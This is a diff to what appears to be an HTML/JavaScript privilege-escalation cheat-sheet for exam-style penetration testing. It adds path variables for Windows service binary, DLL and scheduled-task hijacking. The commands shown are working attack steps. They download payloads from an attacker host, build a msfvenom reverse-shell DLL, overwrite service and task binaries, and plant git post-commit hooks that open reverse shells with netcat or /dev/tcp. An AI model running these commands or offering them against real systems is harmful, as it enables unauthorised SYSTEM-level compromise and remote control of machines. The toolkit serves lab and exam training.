@@ -416,6 +416,21 @@ pre.xfer-cmd{font-size:11px;padding:7px 12px;margin:3px 0;background:var(--bg4)}
     <span class="var-label">WPATH</span>
     <input class="var-input" id="v-wpath" placeholder="C:\Temp" style="width:90px" oninput="updateAll()">
   </div>
+  <div class="var-sep win-only-var"></div>
+  <div class="var-group win-only-var" title="Discovered vulnerable service binary path (§7.5 Service Binary Hijacking)">
+    <span class="var-label" style="color:var(--yellow)">SVCBIN</span>
+    <input class="var-input" id="v-svcbin" placeholder="C:\Svc\svc.exe" style="width:130px;border-color:var(--yellow);color:var(--yellow)" oninput="updateAll()">
+  </div>
+  <div class="var-sep win-only-var"></div>
+  <div class="var-group win-only-var" title="Discovered service/DLL directory (§7.6 DLL Hijacking)">
+    <span class="var-label" style="color:var(--yellow)">SVCDIR</span>
+    <input class="var-input" id="v-svcdir" placeholder="C:\Svc\" style="width:110px;border-color:var(--yellow);color:var(--yellow)" oninput="updateAll()">
+  </div>
+  <div class="var-sep win-only-var"></div>
+  <div class="var-group win-only-var" title="Discovered scheduled task executable path (§7.8 Scheduled Tasks)">
+    <span class="var-label" style="color:var(--yellow)">TASKBIN</span>
+    <input class="var-input" id="v-taskbin" placeholder="C:\Tasks\task.exe" style="width:130px;border-color:var(--yellow);color:var(--yellow)" oninput="updateAll()">
+  </div>
   <div class="var-sep lin-only-var"></div>
   <div class="var-group lin-only-var">
     <span class="var-label">LFILE</span>
@@ -1076,6 +1091,10 @@ After FullPowers re-enables SeImpersonate, any potato works: <code>FullPowers.ex
 <strong>Tip: Look for Out-of-Place Paths</strong>
 Services in C:\Windows\System32 are almost never exploitable. Look for services running from C:\Program Files\CustomApp\, C:\Users\, C:\Temp\, or any user-created directory. You need: (1) write access to the binary, AND (2) ability to restart the service (or wait for reboot).
 </div>
+<div class="callout callout-info" style="border-color:var(--yellow)">
+<strong>&#9998; Fill varbar before using commands below:</strong>
+Set <code style="color:var(--yellow)">SVCBIN</code> = full path to the vulnerable service binary you discovered (e.g. <code>C:\Program Files\CustomApp\svc.exe</code>). All commands in this section auto-update.
+</div>
 <div class="cmd-wrap"><div class="cmd-label">TRANSFER — download tools to target first</div>
 <pre class="cmd">iwr -uri http://{{KALI_IP}}:{{PORT}}/windows/accesschk.exe -Outfile {{WPATH}}\accesschk.exe
 iwr -uri http://{{KALI_IP}}:{{PORT}}/scripts/PowerUp.ps1 -Outfile {{WPATH}}\PowerUp.ps1
@@ -1099,7 +1118,7 @@ sc.exe query type= all state= all | findstr /i "SERVICE_NAME"</pre></div>
 <div class="pipe-step pipe-confirm">
 <span class="pipe-step-label">2. CONFIRM — verify write access to the binary</span>
 <div class="cmd-wrap"><div class="cmd-label">Check file permissions — look for (W) or (F) for current user/groups</div>
-<pre class="cmd">icacls "C:\Path\To\ServiceBinary.exe"</pre></div>
+<pre class="cmd">icacls "{{SVCBIN}}"</pre></div>
 <div class="cmd-wrap"><div class="cmd-label">accesschk deep-dive — (W) = writeable, (F) = full control</div>
 <pre class="cmd">{{WPATH}}\accesschk.exe -uwcqv "Everyone" * /accepteula
 {{WPATH}}\accesschk.exe -uwcqv "Users" * /accepteula
@@ -1136,15 +1155,15 @@ x86_64-w64-mingw32-gcc /tmp/adduser.c -o ~/privesc-toolkit/shell.exe</pre></div>
 <div class="pipe-step pipe-backup">
 <span class="pipe-step-label">BACKUP — save original binary (ALWAYS do this first)</span>
 <div class="cmd-wrap"><div class="cmd-label">Save original — you can restore later with the RESTORE step below</div>
-<pre class="cmd">copy "C:\Path\To\ServiceBinary.exe" "C:\Path\To\ServiceBinary.exe.bak"
+<pre class="cmd">copy "{{SVCBIN}}" "{{SVCBIN}}.bak"
 # Confirm backup exists:
-dir "C:\Path\To\ServiceBinary.exe.bak"</pre></div>
+dir "{{SVCBIN}}.bak"</pre></div>
 </div>
 <div class="pipe-step pipe-exploit">
 <span class="pipe-step-label">3. EXPLOIT — replace binary and trigger</span>
 <div class="cmd-wrap"><div class="cmd-label">Transfer payload and replace service binary</div>
 <pre class="cmd">iwr -uri http://{{KALI_IP}}:{{PORT}}/shell.exe -Outfile {{WPATH}}\shell.exe
-copy {{WPATH}}\shell.exe "C:\Path\To\ServiceBinary.exe"</pre></div>
+copy {{WPATH}}\shell.exe "{{SVCBIN}}"</pre></div>
 <div class="cmd-wrap"><div class="cmd-label">Trigger: restart the service (try in this order)</div>
 <pre class="cmd">Restart-Service -Name '&lt;ServiceName&gt;' -Force
 # If "Access Denied" on Restart-Service:
@@ -1165,7 +1184,7 @@ whoami</pre></div>
 <span class="pipe-step-label">RESTORE — undo everything (use if something breaks)</span>
 <div class="cmd-wrap"><div class="cmd-label">Restore original binary from backup</div>
 <pre class="cmd">sc.exe stop &lt;ServiceName&gt;
-copy "C:\Path\To\ServiceBinary.exe.bak" "C:\Path\To\ServiceBinary.exe"
+copy "{{SVCBIN}}.bak" "{{SVCBIN}}"
 sc.exe start &lt;ServiceName&gt;
 # Verify service is back:
 Get-CimInstance win32_service | Where-Object {$_.Name -eq '&lt;ServiceName&gt;'}</pre></div>
@@ -1180,7 +1199,7 @@ Get-CimInstance win32_service | Where-Object {$_.Name -eq '&lt;ServiceName&gt;'}
 <pre class="cmd">strings ServiceBinary.exe | grep -iE "\.exe|\.dll|cmd|powershell|C:\\"
 # Commands with NO leading path (e.g. "backup.exe") = vulnerable to PATH hijacking</pre></div>
 <div class="cmd-wrap"><div class="cmd-label">On Windows target with Sysinternals strings.exe</div>
-<pre class="cmd">{{WPATH}}\strings.exe "C:\Path\To\ServiceBinary.exe" | findstr /i "\.exe cmd powershell"</pre></div>
+<pre class="cmd">{{WPATH}}\strings.exe "{{SVCBIN}}" | findstr /i "\.exe cmd powershell"</pre></div>
 <div class="cmd-wrap"><div class="cmd-label">flare-floss — finds obfuscated/encoded strings (run on Kali)</div>
 <pre class="cmd">flare-floss ServiceBinary.exe | grep -i "cmd\|powershell\|path\|pass"</pre></div>
 <div class="cmd-wrap"><div class="cmd-label">dnSpy — .NET binary decompilation (GUI, Windows)</div>
@@ -1246,6 +1265,10 @@ sc.exe start &lt;ServiceName&gt;</pre></div>
 <strong>Goal:</strong> Find a service that loads a DLL marked "NAME NOT FOUND" in ProcMon and place yours in a directory that's searched BEFORE the real DLL location — or in the app directory if you can write there.
 </div>
 <div class="callout callout-tip"><strong>💡 Manual method works on the exam.</strong> ProcMon helps on a test VM, but you can find hijackable DLLs manually: check if the service app directory is writable (most common), or if a writable PATH dir exists before System32. Common missing DLLs: version.dll, wlbsctrl.dll, wtsapi32.dll, wow64log.dll, msi.dll.</div>
+<div class="callout callout-info" style="border-color:var(--yellow)">
+<strong>&#9998; Fill varbar before using commands below:</strong>
+Set <code style="color:var(--yellow)">SVCDIR</code> = service application directory (e.g. <code>C:\Program Files\CustomApp</code>). All commands in this section auto-update.
+</div>
 <div class="cmd-wrap"><div class="cmd-label">TRANSFER — compile malicious DLL on Kali (no target download needed for DLL itself)</div>
 <pre class="cmd"># On Kali — compile DLL payload:
 msfvenom -p windows/x64/shell_reverse_tcp LHOST={{KALI_IP}} LPORT={{RPORT}} -f dll -o ~/privesc-toolkit/&lt;MissingDLL&gt;.dll
@@ -1271,15 +1294,15 @@ iwr -uri http://{{KALI_IP}}:{{PORT}}/&lt;MissingDLL&gt;.dll -Outfile {{WPATH}}\&
 <div class="pipe-step pipe-confirm">
 <span class="pipe-step-label">2. CONFIRM — verify write access and identify which DLL is missing</span>
 <div class="cmd-wrap"><div class="cmd-label">Check write access to service app directory (CMD)</div>
-<pre class="cmd">icacls "C:\Path\To\ServiceDir" 2>nul | findstr /i /c:"(F)" /c:"(M)" /c:"(W)"
+<pre class="cmd">icacls "{{SVCDIR}}" 2>nul | findstr /i /c:"(F)" /c:"(M)" /c:"(W)"
 # (M)=Modify is the most common writable flag — critical to include, not just (W)
 # (W) or (F) for Users or Everyone = writable</pre></div>
 <div class="cmd-wrap"><div class="cmd-label">List DLLs in the service directory — gaps are candidates</div>
-<pre class="cmd">dir "C:\Path\To\ServiceDir\*.dll"
+<pre class="cmd">dir "{{SVCDIR}}\*.dll"
 # Common hijackable DLLs when missing: version.dll, wlbsctrl.dll, wtsapi32.dll</pre></div>
 <div class="cmd-wrap"><div class="cmd-label">Confirm two conditions for exploitability</div>
 <pre class="cmd"># 1) DLL is not in the service directory (or app dir)
-dir "C:\Path\To\ServiceDir\version.dll" 2>nul || echo "Missing - candidate"
+dir "{{SVCDIR}}\version.dll" 2>nul || echo "Missing - candidate"
 # 2) You can write to the service app dir OR to a PATH dir that comes before System32
 echo %PATH%
 icacls "C:\writable\path" 2>nul</pre></div>
@@ -1307,15 +1330,15 @@ x86_64-w64-mingw32-g++ /tmp/evil.cpp --shared -o ~/privesc-toolkit/TargetDLL.dll
 <span class="pipe-step-label">BACKUP — record drop location (DLL may not exist yet)</span>
 <div class="cmd-wrap"><div class="cmd-label">If a real DLL exists at the drop location, back it up first</div>
 <pre class="cmd"># Check if DLL already exists at target location:
-dir "C:\Path\To\ServiceDir\&lt;MissingDLL&gt;.dll"
+dir "{{SVCDIR}}\&lt;MissingDLL&gt;.dll"
 # If it exists — back it up:
-copy "C:\Path\To\ServiceDir\&lt;MissingDLL&gt;.dll" "C:\Path\To\ServiceDir\&lt;MissingDLL&gt;.dll.bak"</pre></div>
+copy "{{SVCDIR}}\&lt;MissingDLL&gt;.dll" "{{SVCDIR}}\&lt;MissingDLL&gt;.dll.bak"</pre></div>
 </div>
 <div class="pipe-step pipe-exploit">
 <span class="pipe-step-label">3. EXPLOIT — drop DLL and trigger service</span>
 <div class="cmd-wrap"><div class="cmd-label">Transfer and place the malicious DLL</div>
 <pre class="cmd">iwr -uri http://{{KALI_IP}}:{{PORT}}/&lt;MissingDLL&gt;.dll -Outfile "{{WPATH}}\&lt;MissingDLL&gt;.dll"
-copy "{{WPATH}}\&lt;MissingDLL&gt;.dll" "C:\Path\To\ServiceDir\&lt;MissingDLL&gt;.dll"</pre></div>
+copy "{{WPATH}}\&lt;MissingDLL&gt;.dll" "{{SVCDIR}}\&lt;MissingDLL&gt;.dll"</pre></div>
 <div class="cmd-wrap"><div class="cmd-label">Trigger: restart service to load the DLL</div>
 <pre class="cmd">Restart-Service -Name '&lt;ServiceName&gt;' -Force
 # OR:
@@ -1333,9 +1356,9 @@ whoami</pre></div>
 <span class="pipe-step-label">RESTORE — remove malicious DLL and restore service</span>
 <div class="cmd-wrap"><div class="cmd-label">Stop service, delete malicious DLL, restore backup if one existed</div>
 <pre class="cmd">sc.exe stop &lt;ServiceName&gt;
-del "C:\Path\To\ServiceDir\&lt;MissingDLL&gt;.dll"
+del "{{SVCDIR}}\&lt;MissingDLL&gt;.dll"
 # If backup existed:
-copy "C:\Path\To\ServiceDir\&lt;MissingDLL&gt;.dll.bak" "C:\Path\To\ServiceDir\&lt;MissingDLL&gt;.dll"
+copy "{{SVCDIR}}\&lt;MissingDLL&gt;.dll.bak" "{{SVCDIR}}\&lt;MissingDLL&gt;.dll"
 sc.exe start &lt;ServiceName&gt;</pre></div>
 <div class="cmd-wrap"><div class="cmd-label">Cleanup created user</div>
 <pre class="cmd">net user pwned /delete</pre></div>
@@ -1453,6 +1476,10 @@ sc.exe start &lt;ServiceName&gt;</pre></div>
   <div class="section-subtitle">Find tasks running as SYSTEM with writable executables</div></div>
   <div class="badges"><span class="badge badge-privesc">PRIVESC</span></div>
 </div>
+<div class="callout callout-info" style="border-color:var(--yellow)">
+<strong>&#9998; Fill varbar before using commands below:</strong>
+Set <code style="color:var(--yellow)">TASKBIN</code> = full path to the scheduled task executable you discovered (e.g. <code>C:\Tasks\CleanUp.exe</code>). All commands in this section auto-update.
+</div>
 <div class="pipeline">
 <div class="pipe-step pipe-detect">
 <span class="pipe-step-label">1. DETECT — find tasks running as SYSTEM with writable executables</span>
@@ -1466,10 +1493,10 @@ sc.exe start &lt;ServiceName&gt;</pre></div>
 <div class="pipe-step pipe-confirm">
 <span class="pipe-step-label">2. CONFIRM — verify write access to the task's executable</span>
 <div class="cmd-wrap"><div class="cmd-label">Check icacls on the task executable — you need (W) or (F)</div>
-<pre class="cmd">icacls "C:\Path\To\ScheduledTaskExecutable.exe"</pre></div>
+<pre class="cmd">icacls "{{TASKBIN}}"</pre></div>
 <div class="cmd-wrap"><div class="cmd-label">accesschk confirmation</div>
-<pre class="cmd">{{WPATH}}\accesschk.exe -uwcqv "Users" "C:\Path\To\ScheduledTaskExecutable.exe" /accepteula
-{{WPATH}}\accesschk.exe -uwcqv "Authenticated Users" "C:\Path\To\ScheduledTaskExecutable.exe" /accepteula</pre></div>
+<pre class="cmd">{{WPATH}}\accesschk.exe -uwcqv "Users" "{{TASKBIN}}" /accepteula
+{{WPATH}}\accesschk.exe -uwcqv "Authenticated Users" "{{TASKBIN}}" /accepteula</pre></div>
 <div class="cmd-wrap"><div class="cmd-label">Verify task runs as SYSTEM (or high-priv user)</div>
 <pre class="cmd">schtasks /query /tn "&lt;TaskName&gt;" /fo LIST /v | findstr /i "Run As"</pre></div>
 </div>
@@ -1491,14 +1518,14 @@ x86_64-w64-mingw32-gcc /tmp/adduser.c -o ~/privesc-toolkit/shell.exe</pre></div>
 <div class="pipe-step pipe-backup">
 <span class="pipe-step-label">BACKUP — save original task executable</span>
 <div class="cmd-wrap"><div class="cmd-label">Always back up before overwriting</div>
-<pre class="cmd">copy "C:\Path\To\Executable.exe" "C:\Path\To\Executable.exe.bak"
-dir "C:\Path\To\Executable.exe.bak"</pre></div>
+<pre class="cmd">copy "{{TASKBIN}}" "{{TASKBIN}}.bak"
+dir "{{TASKBIN}}.bak"</pre></div>
 </div>
 <div class="pipe-step pipe-exploit">
 <span class="pipe-step-label">3. EXPLOIT — replace executable and wait/force trigger</span>
 <div class="cmd-wrap"><div class="cmd-label">Transfer payload and replace task binary</div>
 <pre class="cmd">iwr -Uri http://{{KALI_IP}}:{{PORT}}/shell.exe -Outfile {{WPATH}}\shell.exe
-copy {{WPATH}}\shell.exe "C:\Path\To\Executable.exe"</pre></div>
+copy {{WPATH}}\shell.exe "{{TASKBIN}}"</pre></div>
 <div class="cmd-wrap"><div class="cmd-label">Trigger: force run the task now (requires task write perms)</div>
 <pre class="cmd">schtasks /run /tn "&lt;TaskName&gt;"
 # OR: wait for the scheduled next-run time
@@ -1513,8 +1540,8 @@ whoami</pre></div>
 <div class="pipe-step pipe-restore">
 <span class="pipe-step-label">RESTORE — put original executable back</span>
 <div class="cmd-wrap"><div class="cmd-label">Restore from backup</div>
-<pre class="cmd">copy "C:\Path\To\Executable.exe.bak" "C:\Path\To\Executable.exe"
-del "C:\Path\To\Executable.exe.bak"
+<pre class="cmd">copy "{{TASKBIN}}.bak" "{{TASKBIN}}"
+del "{{TASKBIN}}.bak"
 # Verify task still works:
 schtasks /query /tn "&lt;TaskName&gt;" /fo LIST /v</pre></div>
 <div class="cmd-wrap"><div class="cmd-label">Cleanup user</div>
@@ -1527,7 +1554,7 @@ schtasks /query /tn "&lt;TaskName&gt;" /fo LIST /v</pre></div>
 <pre class="cmd"># Windows:
 dir /s /b .git 2&gt;nul
 Get-ChildItem -Path C:\ -Filter ".git" -Recurse -ErrorAction SilentlyContinue -Force | Select FullName
-icacls "C:\Path\To\Repo\.git\hooks"
+icacls "{{SVCDIR}}\.git\hooks"
 
 # Linux:
 find / -name ".git" -type d 2>/dev/null
@@ -1535,14 +1562,14 @@ ls -la /path/to/repo/.git/hooks/
 # Look for (W) write permission for your user/group</pre></div>
 <div class="cmd-wrap"><div class="cmd-label">Step 2 (Windows): Create malicious post-commit hook (runs on every git commit)</div>
 <pre class="cmd">@echo off
-REM Save as: C:\Path\To\Repo\.git\hooks\post-commit
+REM Save as: {{SVCDIR}}\.git\hooks\post-commit
 REM No extension needed — must be executable
 cmd /c "{{WPATH}}\nc64.exe {{KALI_IP}} {{RPORT}} -e cmd.exe"</pre></div>
 <div class="cmd-wrap"><div class="cmd-label">Write hook from PowerShell (no echo quoting issues)</div>
 <pre class="cmd">$hook = "@echo off`r`ncmd /c `"{{WPATH}}\nc64.exe {{KALI_IP}} {{RPORT}} -e cmd.exe`""
-$hook | Out-File -FilePath "C:\Path\To\Repo\.git\hooks\post-commit" -Encoding ASCII
+$hook | Out-File -FilePath "{{SVCDIR}}\.git\hooks\post-commit" -Encoding ASCII
 # Verify:
-Get-Content "C:\Path\To\Repo\.git\hooks\post-commit"</pre></div>
+Get-Content "{{SVCDIR}}\.git\hooks\post-commit"</pre></div>
 <div class="cmd-wrap"><div class="cmd-label">Step 2 (Linux): Create malicious post-commit hook</div>
 <pre class="cmd">echo '#!/bin/bash' > /path/to/repo/.git/hooks/post-commit
 echo 'bash -i >& /dev/tcp/{{KALI_IP}}/{{RPORT}} 0>&1' >> /path/to/repo/.git/hooks/post-commit
@@ -1553,12 +1580,12 @@ schtasks /query /fo LIST /v | findstr /i "git\|commit\|Task Name"
 Get-ScheduledTask | Where-Object { ($_.Actions | ForEach-Object {"$($_.Execute) $($_.Arguments)"}) -match "git" } | Select TaskName
 
 # If you have repo access — trigger manually:
-cd C:\Path\To\Repo
+cd {{SVCDIR}}
 echo test &gt;&gt; trigger.txt
 git add trigger.txt
 git commit -m "trigger"  # post-commit hook fires immediately</pre></div>
 <div class="cmd-wrap"><div class="cmd-label">RESTORE — remove hook after exploit</div>
-<pre class="cmd">del "C:\Path\To\Repo\.git\hooks\post-commit" 2&gt;nul
+<pre class="cmd">del "{{SVCDIR}}\.git\hooks\post-commit" 2&gt;nul
 rm /path/to/repo/.git/hooks/post-commit 2>/dev/null</pre></div>
 </div>
 
@@ -2798,7 +2825,7 @@ reg delete HKLM\SYSTEM\CurrentControlSet\Services\&lt;ServiceName&gt; /v TestWri
 <span class="pipe-step-label">2. CONFIRM — read current ImagePath value (you'll restore this later)</span>
 <div class="cmd-wrap"><div class="cmd-label">Read the current ImagePath — SAVE THIS OUTPUT for the restore step</div>
 <pre class="cmd">reg query HKLM\SYSTEM\CurrentControlSet\Services\&lt;ServiceName&gt; /v ImagePath
-# Example output: ImagePath = C:\Path\To\legitimate.exe
+# Example output: ImagePath = {{SVCBIN}}
 # Copy this value — you'll need it for RESTORE</pre></div>
 <div class="cmd-wrap"><div class="cmd-label">Full key details</div>
 <pre class="cmd">Get-Acl HKLM:\SYSTEM\CurrentControlSet\Services\&lt;ServiceName&gt; | Format-List</pre></div>
@@ -2832,7 +2859,7 @@ sc.exe start &lt;ServiceName&gt;
 # Verify:
 reg query HKLM\SYSTEM\CurrentControlSet\Services\&lt;ServiceName&gt; /v ImagePath</pre></div>
 <div class="cmd-wrap"><div class="cmd-label">Or manually restore ImagePath if you noted it earlier</div>
-<pre class="cmd">reg add HKLM\SYSTEM\CurrentControlSet\Services\&lt;ServiceName&gt; /v ImagePath /t REG_EXPAND_SZ /d "C:\Path\To\OriginalBinary.exe" /f</pre></div>
+<pre class="cmd">reg add HKLM\SYSTEM\CurrentControlSet\Services\&lt;ServiceName&gt; /v ImagePath /t REG_EXPAND_SZ /d "{{SVCBIN}}" /f</pre></div>
 </div>
 </div>
 <div class="notes-toggle" onclick="toggleNotes('win-regdacl')">&#128221; Notes</div>
@@ -6500,12 +6527,15 @@ function getVars() {
     PASS: document.getElementById('v-pass').value || '{{PASS}}',
     DOMAIN: document.getElementById('v-domain').value || '{{DOMAIN}}',
     WPATH: document.getElementById('v-wpath').value || '{{WPATH}}',
-    LFILE: document.getElementById('v-lfile').value || '{{LFILE}}'
+    LFILE: document.getElementById('v-lfile').value || '{{LFILE}}',
+    SVCBIN: document.getElementById('v-svcbin').value || '{{SVCBIN}}',
+    SVCDIR: document.getElementById('v-svcdir').value || '{{SVCDIR}}',
+    TASKBIN: document.getElementById('v-taskbin').value || '{{TASKBIN}}'
   };
 }
 
 function updateAll() {
-  ['kali','port','rport','target','user','pass','domain','wpath','lfile'].forEach(k => {
+  ['kali','port','rport','target','user','pass','domain','wpath','lfile','svcbin','svcdir','taskbin'].forEach(k => {
     const el = document.getElementById('v-' + k);
     if (el) localStorage.setItem('v-' + k, el.value);
   });
@@ -8465,7 +8495,7 @@ document.addEventListener('click', e => {
   document.body.classList.toggle('theme-dark', savedTheme !== 'light');
 
   // 3. Restore variable inputs
-  ['kali','port','rport','target','user','pass','domain','wpath','lfile'].forEach(k => {
+  ['kali','port','rport','target','user','pass','domain','wpath','lfile','svcbin','svcdir','taskbin'].forEach(k => {
     const el = document.getElementById('v-' + k);
     const val = localStorage.getItem('v-' + k);
     if (el && val) el.value = val;
